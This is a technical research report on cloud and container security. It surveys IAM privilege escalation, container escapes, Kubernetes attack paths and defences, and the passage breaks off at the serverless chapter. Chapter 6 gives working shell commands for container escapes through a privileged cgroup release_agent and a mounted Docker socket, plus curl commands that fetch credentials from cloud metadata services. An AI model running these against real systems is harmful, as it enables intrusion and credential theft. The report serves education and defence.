# Cloud & Container Security: A Comprehensive Research Report

> **Difficulty:** 🔴 Advanced | **Prerequisites:** Cloud fundamentals, Linux, networking, containerization basics
> **Estimated reading time:** ~90 minutes

**Date:** April 2026
**Classification:** Technical Research Report
**Total Research Volume:** 14 detailed chapters, ~200KB, comprehensive cloud & container security coverage

---

## Executive Summary

The cloud has become the default deployment substrate for modern software, and with that shift comes a fundamentally different threat model than traditional on-premises infrastructure. The attacker's playbook has evolved from exploiting individual hosts to traversing IAM trust chains, abusing cloud metadata services, escaping container boundaries, and pivoting through Kubernetes clusters. This report synthesizes research across cloud architecture, identity and access management, container security, Kubernetes attack surfaces, serverless paradigms, infrastructure-as-code supply chains, real-world exploitation case studies, detection methodologies, and hardening strategies into a coherent whole.

The central thesis of this report is that **cloud security failures are overwhelmingly failures of configuration and architecture, not of cryptographic strength or software vulnerability**. The Capital One breach of 2019 — still the canonical cloud security incident — was not a zero-day exploit or a sophisticated nation-state attack. It was a misconfigured WAF combined with an over-privileged IAM role attached to an EC2 instance, exploited via a Server-Side Request Forgery (SSRF) attack against the AWS Instance Metadata Service. That pattern — SSRF to metadata to IAM credentials to data exfiltration — has been reproduced in thousands of engagements since, and it epitomizes the structural problem: cloud providers offer granular controls, but the defaults and the abstractions make it trivially easy to misconfigure them in ways that create catastrophic blast radii.

The research covers three major cloud platforms (AWS, Azure, GCP), the container ecosystem (Docker, containerd, runc, OCI), Kubernetes orchestration, serverless architectures, and IaC tooling. It integrates findings from the [Linux Kernel track](../linux_kernel/) (container escape via kernel exploits), the [Zero-Day track](../zero_day/) (exploitation methodology), the [OSEE track](../OSEE/) (hypervisor-level attacks), the [Supply Chain track](../supply_chain_security/) (CI/CD and dependency attacks), the [macOS track](../MacOS/) (cloud Mac instances), and [CPU Rings track](../ring_and_vulns/) (hypervisor escape from VM isolation).

### Key Findings

1. **IAM is the primary attack surface in cloud environments.** The three major CSPs collectively expose over 75 documented privilege escalation paths through IAM misconfigurations alone. AWS has 30+ paths from a single low-privilege starting point; Azure has 25+; GCP has 20+. The IAM policy evaluation logic in each platform is complex enough that even experienced engineers frequently create policies with unintended privilege escalation paths.

2. **Container escape is practical and multifaceted.** The shared-kernel model of Linux containers means that every kernel vulnerability (see [CVE-2022-0185](../linux_kernel/), [CVE-2024-1086](../linux_kernel/)) is a potential container escape. But kernel exploits are not the primary vector — misconfigured containers (`privileged: true`, `SYS_ADMIN` capability, Docker socket mounts, hostPath `/` volumes) account for the vast majority of real-world escapes. The runc vulnerability CVE-2019-5736 demonstrated that even well-configured containers can be escaped through runtime bugs, and CVE-2024-21626 showed that leaked file descriptors remain a persistent escape path.

3. **Kubernetes attack paths are lateral and deep.** A Kubernetes cluster is a graph of trust relationships: Pods trust ServiceAccounts, ServiceAccounts trust RBAC bindings, RBAC bindings trust API server permissions, the API server trusts etcd, etcd trusts node security, nodes trust kubelets, kubelets trust container runtimes. Every edge in this graph is a potential escalation path. The `nodes/proxy` permission alone lets a compromised service account execute commands on any pod on any node, which is equivalent to cluster-admin in practice.

4. **The metadata service is the single most abused cloud primitive.** SSRF attacks against `169.254.169.254` (AWS/Azure) or `metadata.google.internal` (GCP) remain the most effective initial access vector in cloud environments. IMDSv2 on AWS makes this harder but not impossible — an SSRF that can send a PUT request can still obtain a token. Azure's metadata service requires a `Metadata: true` header but no cryptographic challenge. GCP requires a `Metadata-Flavor: Google` header. All three remain exploitable through header injection in many application frameworks.

5. **Serverless does not eliminate the attack surface — it relocates it.** Lambda functions, Azure Functions, and Google Cloud Functions all execute with IAM roles that are frequently over-provisioned. Injection attacks via event payloads (SQS messages, S3 events, API Gateway requests) can achieve arbitrary code execution within the function's permission boundary. The 2019 Capital One attack used exactly this pattern: SSRF in a WAF-triggered Lambda → metadata credentials → S3 data exfiltration.

6. **Infrastructure as Code is a supply chain attack surface.** Terraform modules, Helm charts, container base images, and CI/CD pipelines form a dependency graph that attackers can compromise at any point. Dependency confusion attacks (registering a package name in a public registry that exists in a private one), typosquatting (e.g., `python-requests` vs `python-resquests`), and compromised CI/CD pipelines (as in the SolarWinds SUNBURST attack) all apply with equal force to cloud-native deployments.

7. **Detection in cloud environments requires a different mental model.** Traditional host-based detection (process monitoring, file integrity, network connections) is insufficient when the attack moves through API calls, IAM role assumption chains, and serverless function invocations. Cloud-native detection requires CloudTrail logs, VPC Flow Logs, Kubernetes audit logs, and runtime container monitoring (Falco, eBPF-based agents) correlated across a SIEM. The MITRE ATT&CK Cloud matrix provides the framework, but implementation remains immature at most organizations.

---

## Table of Contents

### Part I: Cloud Architecture & Threat Model
- [Chapter 1: Cloud Architecture & Shared Responsibility](#chapter-1-cloud-architecture--shared-responsibility)
- [Chapter 2: Cloud Attack Surface & Threat Modeling](#chapter-2-cloud-attack-surface--threat-modeling)

### Part II: Identity & Access Management
- [Chapter 3: IAM Fundamentals & Policies](#chapter-3-iam-fundamentals--policies)
- [Chapter 4: IAM Privilege Escalation](#chapter-4-iam-privilege-escalation)

### Part III: Container Security
- [Chapter 5: Container Internals & Docker](#chapter-5-container-internals--docker)
- [Chapter 6: Container Escape Techniques](#chapter-6-container-escape-techniques)

### Part IV: Kubernetes
- [Chapter 7: Kubernetes Architecture & Security](#chapter-7-kubernetes-architecture--security)
- [Chapter 8: Kubernetes Attack Paths](#chapter-8-kubernetes-attack-paths)

### Part V: Serverless & IaC
- [Chapter 9: Serverless Security](#chapter-9-serverless-security)
- [Chapter 10: IaC & Supply Chain](#chapter-10-iac--supply-chain)

### Part VI: Exploitation, Detection & Hardening
- [Chapter 11: Cloud Exploitation Case Studies](#chapter-11-cloud-exploitation-case-studies)
- [Chapter 12: Detection & Monitoring](#chapter-12-detection--monitoring)
- [Chapter 13: Hardening & Zero-Trust](#chapter-13-hardening--zero-trust)
- [Chapter 14: Compliance Automation](#chapter-14-compliance-automation)

---

# PART I: CLOUD ARCHITECTURE & THREAT MODEL

---

## Chapter 1: Cloud Architecture & Shared Responsibility

> **Detailed research:** [`docs/01a_cloud_architecture_shared_responsibility.md`](docs/01a_cloud_architecture_shared_responsibility.md)

### 1.1 The Cloud Threat Model

Cloud computing replaces physical perimeter security with a shared responsibility model where the provider secures the infrastructure and the customer secures their configuration, data, and access. This division is deceptively simple: in practice, the boundary is porous and frequently misunderstood.

In IaaS (Infrastructure as a Service), the provider secures the physical data center, the hypervisor, and the network fabric. The customer is responsible for everything above the hypervisor: the guest OS, applications, data, identity management, and network security groups. In PaaS (Platform as a Service), the provider additionally manages the runtime, middleware, and OS, but the customer still owns application logic, data classification, and access control. In SaaS (Software as a Service), the provider manages almost everything — but the customer retains responsibility for data classification, access policies, and regulatory compliance.

The critical insight is that **every abstraction layer the cloud provider absorbs removes a potential vulnerability class but also removes a control point from the customer**. When AWS manages the hypervisor, the customer cannot harden it. When Azure manages the container runtime, the customer cannot configure seccomp profiles. This creates a fundamental tension: the shared responsibility model both reduces and concentrates risk.

### 1.2 Multi-Tenant Isolation Failures

Cloud environments are multi-tenant by design. A single physical host may run VMs belonging to hundreds of customers, separated only by the hypervisor. The isolation model has been repeatedly probed:

- **VM Escape via Hyper-V (CVE-2018-0959, CVE-2019-0631):** Multiple Windows Hyper-V vulnerabilities allowed guest-to-host escape, violating the fundamental isolation boundary.
- **Rowhammer in Cloud (2016-2020):** DRAM bit-flip attacks proved feasible across co-located VMs on public cloud infrastructure, though cloud providers now deploy ECC memory and rate-limit `CLFLUSH` instructions.
- **NetSpectre (2018):** Spectre-variant network-based side channel demonstrated across VM boundaries, enabling information leakage without shared execution context.
- **Cloudbleed (2017):** A buffer overflow in Cloudflare's reverse proxy leaked memory from one customer's requests into another's cached responses — a multi-tenant isolation failure at the application layer, not the hypervisor.

For container orchestration, the isolation boundary is even thinner. Linux containers share the host kernel, meaning that a kernel vulnerability in any subsystem — netfilter (CVE-2023-32233, CVE-2024-1086), io_uring, eBPF — can be weaponized for container escape. This directly connects to the [Linux Kernel track](../linux_kernel/), where kernel exploitation techniques are documented in depth.

### 1.3 Control Plane vs. Data Plane

The cloud control plane (API endpoints for resource management, IAM, and configuration) is a distinct attack surface from the data plane (the actual compute, storage, and network resources). Compromise of the control plane is game-over: an attacker with API access can create, modify, and destroy any resource. This is why IAM — the gatekeeper of the control plane — is the single most critical security domain in cloud environments.

The data plane, by contrast, is the runtime execution environment: the VMs, containers, functions, and storage systems that process customer data. Many cloud attacks begin at the data plane (a vulnerable web application, an SSRF, a compromised container) and pivot to the control plane (stealing IAM credentials, assuming roles, escalating privileges).

---

## Chapter 2: Cloud Attack Surface & Threat Modeling

> **Detailed research:** [`docs/01b_cloud_attack_surface_threat_modeling.md`](docs/01b_cloud_attack_surface_threat_modeling.md)

### 2.1 MITRE ATT&CK Cloud Matrix

The MITRE ATT&CK matrix for cloud covers 10 tactics with cloud-specific techniques:

| Tactic | Key Cloud Techniques |
|--------|---------------------|
| Initial Access | Valid accounts, public-facing apps, supply chain compromise, phishing |
| Execution | Cloud API execution, container runtime, serverless function invocation |
| Persistence | Additional cloud accounts, IAM backdoors, Kubernetes cronjobs, SSM agents |
| Privilege Escalation | IAM privilege escalation paths, container escape, AssumeRole chains |
| Defense Evasion | Disable logging (CloudTrail), obfuscate in serverless, delete cloud resources |
| Credential Access | Cloud metadata SSRF, Secrets Manager extraction, Key Vault access |
| Discovery | Cloud service enumeration, IAM policy enumeration, network topology discovery |
| Lateral Movement | Inner-cluster, cross-VPC, cross-account, cloud API pivoting |
| Collection | S3 bucket enumeration, EBS snapshot exfiltration, database dumps |
| Exfiltration | Transfer to external account, DNS exfiltration, cloud service abuse |

### 2.2 Cross-Tenant Attack Vectors

Cloud environments introduce attack surfaces that do not exist in on-premises infrastructure:

1. **Metadata Service SSRF:** The instance metadata service (169.254.169.254) is reachable from any compute instance and provides IAM credentials. An SSRF vulnerability in any application on the instance can retrieve these credentials, giving the attacker the instance's full IAM permissions. This was the exact vector in the Capital One breach.

2. **IAM Role Chaining:** A low-privilege role can assume a higher-privilege role, which can assume an even higher-privilege role. Attackers map these chains to find paths from `lambdaExecutionRole` to `AdministratorAccess`.

3. **Cross-Account Trust:** Incorrectly configured resource policies (S3 bucket policies, KMS key policies, Lambda permission policies) can allow cross-account access. The pattern `Principal: "*"` in a resource policy combined with `Condition: {}` that doesn't properly restrict access is a frequent misconfiguration.

4. **Cloud Storage Enumeration:** Publicly accessible S3 buckets, Azure Blob containers, and GCS buckets remain a persistent problem. Tools like `aws s3 ls`, `az storage blob list`, and `gsutil ls` make enumeration trivial; defensive scanning tools like `CloudSplaining` and `ScoutSuite` try to find these before attackers do.

5. **DNS-Based Exfiltration:** Cloud environments typically allow outbound DNS on port 53, which is rarely inspected. Attackers tunnel data through DNS queries to attacker-controlled nameservers — a technique that bypasses most network egress controls.

---

# PART II: IDENTITY & ACCESS MANAGEMENT

---

## Chapter 3: IAM Fundamentals & Policies

> **Detailed research:** [`docs/02a_iam_fundamentals_policies.md`](docs/02a_iam_fundamentals_policies.md)

### 3.1 The Three Cloud IAM Models

**AWS IAM** uses an explicit-deny-first evaluation model: all requests are implicitly denied unless an explicit Allow exists, and an explicit Deny always overrides an Allow. The evaluation order is:

1. Evaluate all applicable policies (identity-based, resource-based, SCPs, permissions boundaries, session policies)
2. If any policy has an explicit Deny, the request is **DENY**
3. If at least one policy has an explicit Allow (and no Deny), and SCPs allow it, and permissions boundaries allow it, the request is **ALLOW**
4. Otherwise, **IMPLICIT DENY**

The subtlety that trips up many engineers is that **resource-based policies are treated differently from identity-based policies** for cross-account access. When a principal in Account A accesses a resource in Account B, the request must be allowed by *both* the principal's identity-based policies in Account A *and* the resource-based policy in Account B — but if the resource-based policy explicitly allows it, the identity-based policy doesn't need an explicit Allow (it just must not have an explicit Deny). This asymmetry creates unexpected privilege escalation paths.

**Azure RBAC** uses a flat role assignment model: a principal (user, group, service principal, managed identity) is assigned a role (built-in or custom) at a scope (management group, subscription, resource group, resource). The evaluation is simpler than AWS — it's additive across all applicable role assignments, with no explicit Deny mechanism (until Azure added deny assignments in 2022). The danger is **scope creep**: a `Contributor` role at the subscription level grants excessive permissions across all resource groups.

Azure also has **Azure AD roles** (Directory Readers, Global Administrator, etc.) that are distinct from **Azure RBAC roles** (Owner, Contributor, Reader, etc.). The Global Administrator in Azure AD can elevate to User Access Administrator in RBAC, effectively gaining root access to all Azure subscriptions. This cross-domain escalation path is frequently overlooked.

**GCP IAM** uses a resource hierarchy (Organization → Folders → Projects → Resources) with a deny-by-default model. GCP's unique feature is **Organization Policy Constraints**, which can enforce restrictions like `constraints/iam.disableServiceAccountKeyCreation` (prevent SA key creation) or `constraints/compute.requireOsLogin` (enforce OS Login for SSH). The GCP IAM evaluation is also additive within a hierarchy level, but **IAM denies always take precedence over allows**, and organization policies can enforce deny-only constraints.

### 3.2 Trust Relationship Attacks

IAM trust relationships — the policies that define who can assume a role — are a frequent source of misconfiguration:

**AWS Cross-Account Trust:**
```json
{
  "Principal": {
    "AWS": "arn:aws:iam::111122223333:root"
  },
  "Effect": "Allow",
  "Action": "sts:AssumeRole"
}
```

This trusts *any* principal in account 111122223333 that the account administrator chooses. If that account is compromised, the trusting account is also compromised. The fix is to restrict to specific roles:

```json
{
  "Principal": {
    "AWS": "arn:aws:iam::111122223333:role/SpecificRole"
  }
}
```

**AWS Federated Trust:**
The `Condition` element in federated trust policies is frequently misconfigured. Using `StringEquals` where `StringLike` should be used (or vice versa) can allow unintended identity providers to assume roles.

**Azure Application Registration:**
An Azure AD application registration with `Application.ReadWrite.All` can create a new application, assign it `Directory.ReadWrite.All` with admin consent, and escalate to Global Administrator. This is the Azure equivalent of the AWS `iam:CreateRole` → `iam:AttachRolePolicy` chain.

**GCP Service Account Impersonation:**
The `iam.serviceAccounts.actAs` permission allows a principal to impersonate a service account, inheriting all its permissions. If a low-privilege user can `actAs` a high-privilege service account, they effectively gain the service account's full access.

---

## Chapter 4: IAM Privilege Escalation

> **Detailed research:** [`docs/02b_iam_privilege_escalation.md`](docs/02b_iam_privilege_escalation.md)

### 4.1 AWS Privilege Escalation: The 30+ Paths

Rhino Security Labs' [aws_iam_privesc_scan](https://github.com/RhinoSecurityLabs/Security-Research/tree/master/AWS%20IAM%20Privilege%20Escalation) documented 30+ privilege escalation paths in AWS. These fall into several categories:

**Category 1: IAM Modification (Direct)**
- `iam:CreateAccessKey` on another user → direct credential theft
- `iam:CreateLoginProfile` → set console password for any user
- `iam:UpdateLoginProfile` → reset any user's password
- `iam:AttachUserPolicy` / `iam:PutUserPolicy` → attach AdministratorAccess to self
- `iam:AttachRolePolicy` / `iam:PutRolePolicy` → modify any role's policy

**Category 2: Role Assumption (Chained)**
- `sts:AssumeRole` → assume a role with higher permissions
- The attacker maps all assumable roles and their permission boundaries, then chains through roles to reach admin-level access

**Category 3: Service Role Abuse (Indirect)**
- `iam:PassRole` + `lambda:CreateFunction` → create Lambda with admin role, invoke it
- `iam:PassRole` + `ec2:RunInstances` → launch EC2 with admin role, SSH in
- `iam:PassRole` + `cloudformation:CreateStack` → create stack with admin role
- `iam:PassRole` + `glue:CreateDevEndpoint` → create development endpoint with admin role
- `lambda:UpdateFunctionCode` → modify existing Lambda to exfiltrate credentials from its role
- `lambda:UpdateFunctionConfiguration` → add environment variables or layers to existing Lambda

**Category 4: Credential Extraction**
- `secretsmanager:GetSecretValue` → extract stored credentials
- `ssm:GetParameters` → extract parameters (including `SecureString` with `--with-decryption`)
- `ssm:StartSession` → interactive shell on any EC2 instance with SSM enabled

### 4.2 Azure Privilege Escalation: The 25+ Paths

Azure's escalation paths center on three mechanisms:

1. **Role Assignment Abuse:** `Microsoft.Authorization/roleAssignments/write` at the subscription level grants Owner-equivalent access. The Privileged Identity Management (PIM) system adds time-bound eligibility, but many organizations don't use PIM or misconfigure it.

2. **Application Registration:** A user with `Application.ReadWrite.All` can create an application, assign it API permissions with admin consent, and use the application's service principal to escalate. This is one of the most common Azure escalation paths.

3. **Managed Identity Abuse:** System-assigned managed identities inherit the permissions of the resource they're attached to. If a compromised VM's managed identity has `Owner` or `Contributor` at the subscription level, the attacker has subscription-wide control. User-assigned managed identities can be attached to multiple resources, meaning compromising one resource gives access to the identity's permissions across all attached resources.

### 4.3 GCP Privilege Escalation: The 20+ Paths

GCP's escalation paths are defined by the `iam.serviceAccounts.actAs` permission, which is the GCP equivalent of AWS's `sts:AssumeRole`:

- **Service Account Key Creation:** `iam.serviceAccountKeys.create` on a privileged SA → download JSON key → full SA access
- **Compute Instance with SA:** `compute.instances.create` + ability to attach a privileged SA → launch VM with SA credentials accessible via metadata
- **Cloud Function with SA:** `cloudfunctions.functions.create` + `iam:PassRole` equivalent → deploy function with privileged SA
- **Cloud Run with SA:** Similar to Cloud Functions but with container images
- **Secret Manager Access:** `secretmanager.versions.access` → retrieve SA keys or other credentials stored as secrets

---

# PART III: CONTAINER SECURITY

---

## Chapter 5: Container Internals & Docker

> **Detailed research:** [`docs/03a_container_internals_docker.md`](docs/03a_container_internals_docker.md)

### 5.1 Linux Namespaces: The Foundation of Container Isolation

Containers are not virtual machines. They are processes isolated by Linux kernel namespaces and restricted by cgroups and capabilities. Understanding this distinction is critical for understanding both their security properties and their attack surface.

**Namespaces** provide isolation for specific system resources:

| Namespace | What It Isolates | Container Escape Relevance |
|-----------|-----------------|--------------------------|
| PID | Process IDs | Processes see only their own PID tree; hostPID bypasses this |
| Network | Network stack | Containers get their own network interfaces, routing tables |
| Mount | Filesystem mount points | Mount propagation can leak host filesystems |
| UTS | Hostname and NID | Container can set its own hostname |
| IPC | System V IPC, POSIX message queues | Isolates inter-process communication |
| User | UID/GID mapping | Maps container root (UID 0) to unprivileged host UID |
| Cgroup | Cgroup root directory | Isolates cgroup view (added in kernel 4.6) |

**The User Namespace** deserves particular attention. It's the only namespace that allows an unprivileged user on the host to create containers where they appear as root inside the container. This is the foundation of "rootless containers" and is the most important isolation mechanism for preventing container escape. When a container runs without user namespace remapping (`--userns=host` or by default in Docker), the root user inside the container is UID 0 on the host — meaning that any mechanism to escape the container (kernel exploit, misconfigured mount, leaked capability) gives immediate host root.

### 5.2 Capabilities: The Fine-Grained Privilege Model

Linux capabilities divide the monolithic root privilege (all 37 capabilities on x86-64) into discrete units. Docker drops all capabilities by default and adds back a specific set:

**Docker default capabilities:** `AUDIT_WRITE`, `CHOWN`, `DAC_OVERRIDE`, `FCHOWN`, `FSETID`, `FOWNER`, `MKNOD`, `NET_RAW`, `SETGID`, `SETUID`, `SETFCAP`, `SETPCAP`, `NET_BIND_SERVICE`, `SYS_CHROOT`, `KILL`

The critical capabilities for container escape:

| Capability | Escape Risk |
|------------|-------------|
| `SYS_ADMIN` | Mount filesystems, modify cgroups, set namespace — full escape path |
| `SYS_PTRACE` | Inject code into host processes (if hostPID) |
| `SYS_MODULE` | Load kernel modules — kernel-level compromise |
| `DAC_READ_SEARCH` | Bypass file read permissions |
| `NET_ADMIN` | Modify network stack, create tunnel interfaces, MITM |
| `SYS_RAWIO` | Direct disk I/O — modify host filesystem |
| `LINUX_IMMUTABLE` | Modify immutable files |

### 5.3 Seccomp and AppArmor

**Seccomp** (Secure Computing Mode) restricts the system calls a container can make. Docker's default seccomp profile blocks approximately 44 of the ~400 syscalls on x86-64, including `keyctl`, `add_key`, `request_key`, `userfaultfd`, `perf_event_open`, and others known to be attack vectors.

**AppArmor** and **SELinux** provide mandatory access control (MAC). Docker's default AppArmor profile (`docker-default`) prevents mounts, signal delivery to the init process, and access to `/proc` and `/sys` internals. In Kubernetes, Pod Security Standards (replacing PodSecurityPolicy as of 1.25) define three profiles: `privileged` (unrestricted), `baseline` (minimal restrictions), and `restricted` (heavily restricted).

The interaction between these layers is crucial: an AppArmor profile can block a syscall that seccomp allows, and vice versa. Defense in depth means using all three (capabilities + seccomp + AppArmor) simultaneously.

---

## Chapter 6: Container Escape Techniques

> **Detailed research:** [`docs/03b_container_escape_techniques.md`](docs/03b_container_escape_techniques.md)

### 6.1 The Container Escape Taxonomy

Container escapes fall into four categories:

1. **Configuration Escapes** — exploiting misconfigured containers (privileged, excessive capabilities, sensitive mounts)
2. **Runtime Escapes** — exploiting bugs in the container runtime (runc, containerd, CRI-O)
3. **Kernel Escapes** — exploiting Linux kernel vulnerabilities from inside a container
4. **Cloud Escapes** — exploiting cloud-specific mechanisms (metadata service, node IAM)

### 6.2 Configuration Escapes

**Privileged Container Escape (`privileged: true`):**
```bash
# Inside a privileged container:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Or via cgroup release_agent:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xx
echo 1 > /tmp/cgrp/xx/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/1/mountinfo)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'ps > /host_output' >> /cmd && chmod +x /cmd
sh -c "echo 0 > /tmp/cgrp/xx/cgroup.procs"
```

**Docker Socket Escape:**
```bash
# If /var/run/docker.sock is mounted into the container:
curl -s -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"]}'
# Then start and exec into the container with the host filesystem mounted
```

**hostPath Escape (`/` mount):**
```yaml
volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
```
When the entire host filesystem is mounted into a container, the container can `chroot` into the host filesystem, modify `/etc/crontab`, add SSH keys to `/root/.ssh/authorized_keys`, or install systemd services.

### 6.3 Runtime Escapes

**CVE-2019-5736 (runc):** The most impactful container runtime vulnerability. runc's `/proc/self/exe` handling allowed a malicious container process to overwrite the runc binary on the host by creating a symlink from `/proc/self/exe` to a writable path and waiting for the host to execute `runc exec` on the container. The attacker replaces the runc binary with a reverse shell, and when the administrator runs `docker exec` or `kubectl exec`, the host executes the attacker's code instead of runc. Patch: runc 1.0-rc6 and later use `O_PATH|O_NOFOLLOW` to open `/proc/self/exe` and verify the path before executing.

**CVE-2020-15257 (containerd):** containerd's shim API was exposed on an abstract Unix domain socket (`@/containerd-shim/<id>.sock`), accessible from within the host's network namespace. If a container shares the host's network namespace (`--network=host`), it can connect to the shim socket and create a new container process with arbitrary arguments on the host. Patch: containerd 1.3.9 and 1.4.3 restrict the shim socket to the shim's PID namespace.

**CVE-2024-21626 (runc):** A leaked file descriptor in runc allowed container escape via `WORKDIR` set to `/proc/self/fd/<n>`, which points to a host directory. By setting `WORKDIR` to a `/proc/self/fd` path in the container image, an attacker could escape the container's filesystem namespace and access the host filesystem. Patch: runc 1.1.12 ensures file descriptors are properly closed during container setup.

### 6.4 Kernel Escapes

Because containers share the host kernel, any kernel vulnerability is a potential container escape. The key CVEs:

- **CVE-2022-0185:** Heap overflow in `legacy_parse_param()` during filesystem context parsing. A container process could trigger a heap overflow by mounting a crafted filesystem, gaining arbitrary memory write and thus container escape.

- **CVE-2024-1086:** Double-free in the netfilter `nf_tables` subsystem. Achieves local privilege escalation with a 99.4% success rate. From a container, this gives root on the host kernel — and thus container escape.

- **CVE-2022-0492:** Bypass of cgroup v1 `BPF` code filtering, allowing a process inside a cgroup to escape cgroup restrictions. This is particularly relevant because containers use cgroups for resource isolation.

These kernel escape techniques are documented in detail in the [Linux Kernel track](../linux_kernel/docs/08b_modern_cves.md), particularly the sections on container escape CVEs. The [Zero-Day track](../zero_day/) provides the exploitation methodology for building working exploits against these vulnerabilities.

### 6.5 Cloud Escapes (Metadata Service SSRF)

The connection between container escape and cloud metadata access is direct: once inside a container, the attacker's first recon step is often to reach the metadata service. From a Kubernetes pod:

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure
curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

These credentials provide the attacker with the pod's IAM permissions, which — in misconfigured environments — may include access to S3 buckets, storage accounts, Key Vault secrets, or even cluster-admin roles.

---

# PART IV: KUBERNETES

---

## Chapter 7: Kubernetes Architecture & Security

> **Detailed research:** [`docs/04a_kubernetes_architecture_security.md`](docs/04a_kubernetes_architecture_security.md)

### 7.1 Architecture: Trust Boundaries and Attack Surfaces

A Kubernetes cluster has multiple trust boundaries, each of which is a potential attack surface:

1. **User → API Server:** The API server is the central control plane, exposed on port 6443 (HTTPS) and 8080 (insecure, deprecated). Authentication is via certificates, tokens, or webhook. RBAC (Role-Based Access Control) governs authorization. The API server is the most critical trust boundary because it controls everything.

2. **API Server → etcd:** etcd is the cluster's state store. If an attacker reaches etcd (default port 2379), they can read all secrets, modify cluster state, and create arbitrary resources. etcd should never be exposed outside the cluster and should use TLS with client certificate authentication.

3. **API Server → Kubelet:** Each node runs a kubelet that manages pods. The kubelet exposes a read-only port (10255, deprecated) and a secure API (10250). If anonymous auth is enabled on the kubelet (`--anonymous-auth=true`), anyone with network access can read pod specs, execute commands, and access container logs.

4. **Kubelet → Container Runtime:** The kubelet talks to the container runtime (containerd, CRI-O) via the CRI (Container Runtime Interface). A vulnerability in the kubelet or runtime can compromise all pods on the node.

5. **Pod → Pod (East-West):** By default, Kubernetes allows all pod-to-pod communication within a cluster. Network Policies are the mechanism for restricting this, but they must be explicitly configured.

6. **Pod → Cloud Metadata:** The cloud metadata service is network-reachable from any pod by default. This is the metadata SSRF attack vector described in Chapter 2.

### 7.2 RBAC: The Permission Model

Kubernetes RBAC (Role-Based Access Control) uses four key objects:

- **Role** / **ClusterRole:** Define permissions (verbs + resources + API groups)
- **RoleBinding** / **ClusterRoleBinding:** Bind a role to subjects (users, groups, service accounts)

Common dangerous RBAC configurations:

```yaml
# Dangerous: cluster-admin for all service accounts
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: dangerous-binding
subjects:
  - kind: Group
    name: system:serviceaccounts
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

```yaml
# Dangerous: allow creating privileged pods
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-creator
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "delete"]
```

The `escalate` verb is particularly dangerous: it allows a user to create roles with permissions they don't themselves hold. Combined with `bind`, it allows binding those roles to themselves.

### 7.3 Admission Controllers and Pod Security

Admission controllers intercept requests to the API server before they are persisted. The Pod Security Standards (PSS), replacing PodSecurityPolicy as of Kubernetes 1.25, define three privilege levels:

| Profile | Allows | Blocks |
|---------|--------|--------|
| **Privileged** | Everything | Nothing (unrestricted) |
| **Baseline** | Limited capabilities, no privileged containers | hostProcess, hostIPC, hostNetwork, hostPorts, hostPath, privileged, capabilities beyond baseline |
| **Restricted** | Minimal | All of baseline + capabilities (drop ALL, add NET_BIND_SERVICE), runAsNonRoot, seccompProfile, allowPrivilegeEscalation=false |

The `restricted` profile should be the default for all production workloads. The `baseline` profile should be the minimum. The `privileged` profile should only be used for system pods that require it (CSI drivers, CNI plugins, monitoring agents).

---

## Chapter 8: Kubernetes Attack Paths

> **Detailed research:** [`docs/04b_kubernetes_attack_paths.md`](docs/04b_kubernetes_attack_paths.md)

### 8.1 The Kubernetes Attack Tree

A Kubernetes cluster can be compromised through multiple entry points. The most common attack paths:

**Path 1: Application → Pod → ServiceAccount → RBAC → Cluster Compromise**
1. Web application vulnerability (RCE, SSRF) in a pod
2. Attacker accesses pod's service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
3. Enumerate RBAC permissions with `kubectl auth can-i --list`
4. If service account has `pods/exec`, `secrets/get`, or `nodes/proxy`, escalate to cluster compromise

**Path 2: Metadata SSRF → Cloud Credentials → Cluster Admin**
1. SSRF in application inside pod
2. Access cloud metadata service (169.254.169.254)
3. Retrieve cloud IAM credentials
4. If the node's IAM role includes Kubernetes admin permissions, compromise the cluster
5. This was the exact path in multiple real-world breaches

**Path 3: etcd Access → Full Cluster Compromise**
1. Network access to etcd port 2379
2. Read all cluster secrets, including service account tokens for `system:masters`
3. Use `kubectl` with stolen credentials for full cluster access

**Path 4: Kubelet API → Node Compromise**
1. Access kubelet API on port 10250 (often exposed on internal network)
2. If anonymous auth is enabled, `GET /pods` reveals all pod specs on the node
3. `POST /exec/<namespace>/<pod>/<container>` executes commands in any container on the node
4. If kubelet config is accessible, extract cluster CA and admin credentials

**Path 5: Container Escape → Node Access → Cluster Pivot**
1. Kernel exploit from within a container (CVE-2022-0185, CVE-2024-1086)
2. Privileged container escape (`nsenter` to PID 1)
3. Access node's kubeconfig at `/etc/kubernetes/admin.conf`
4. Use kubeconfig for full cluster admin access

### 8.2 RBAC Privilege Escalation in Kubernetes

The following RBAC permissions enable privilege escalation:

| Permission | Escalation Path |
|-----------|-----------------|
| `pods/create` | Create privileged pod with hostPath mount |
| `pods/exec` | Execute arbitrary commands in any pod |
| `pods/update` | Add sidecar container to privileged pod |
| `secrets/get,list` | Extract all secrets (DB passwords, API keys, SA tokens) |
| `nodes/proxy` | Access kubelet API on any node → exec in any pod |
| `serviceaccounts/create` + `rolebindings/create` | Create SA, bind to cluster-admin, use SA token |
| `certificatesigningrequests/create` + `certificatesigningrequests/approve` | Create CSR, approve it → TLS boot as a new node |
| `escalate` | Create roles with permissions you don't hold |
| `bind` | Bind any role (including cluster-admin) to yourself |

---

# PART V: SERVERLESS & IAC

---

## Chapter 9: Serverless Security

> **Detailed research:** [`docs/05a_serverless_security.md`](docs/05a_serverless_security.md)

### 9.1 The Serverless Threat Model

